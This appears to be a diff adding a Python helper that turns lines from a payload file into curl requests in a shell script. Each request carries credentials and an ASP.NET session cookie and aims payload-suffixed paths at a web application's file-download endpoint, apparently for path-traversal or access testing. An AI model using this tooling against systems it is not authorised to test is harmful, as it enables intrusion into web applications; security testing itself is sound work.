@@ -1,0 +1,35 @@
+payload_file = "/mnt/data/payload7.txt"
+shell_script = "/mnt/data/existpayload.sh"
+username = "your_username"
+password = "your_password"
+session_id = "your_session_id"  # ASP.NET Session ID
+
+# Read payloads from the file
+with open(payload_file, "r") as pf:
+    payloads = [line.strip().strip('"') + "QP19_02_2025%2001_16_01.zip" for line in pf if line.strip()]
+
+# Read the existing shell script content
+with open(shell_script, "r") as sf:
+    script_content = sf.read()
+
+# Insert payloads into the shell script format
+new_lines = [script_content]  # Keep existing content
+for payload in payloads:
+    new_lines.append(f'echo -n "Payload [{payload}]:"')
+    new_lines.append(f'code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{{http_code}}, Length : %{{size_download}}\n" "${{target}}{payload}" '
+                      f'-H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 '
+                      f'(KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" '
+                      f'-u "{username}:{password}" '
+                      f'-H "Cookie: ASP.NET_SessionId={session_id}")')
+    new_lines.append(f'payload=$(printf "╭$(printf \"%.0s─\" $(seq \"$((`tput cols` - 2))\"))╮\n${{cyan}} '
+                      f'╰─> PAYLOAD${{end}} : ${{green}}curl -k -s \"${{target}}{payload}\" '
+                      f'-H \"User-Agent: Mozilla/5.0\" '
+                      f'-u \"{username}:{password}\" '
+                      f'-H \"Cookie: ASP.NET_SessionId={session_id}\"\n${{end}}╰$(printf \"%.0s─\" $(seq \"$((`tput cols` - 2))\"))╯\n")')
+    new_lines.append("print")
+
+# Overwrite the script with the new content
+with open(shell_script, "w") as sf:
+    sf.write("\n".join(new_lines) + "\n")
+
+print("Payloads successfully inserted into existpayload.sh with ASP.NET Session ID authentication")
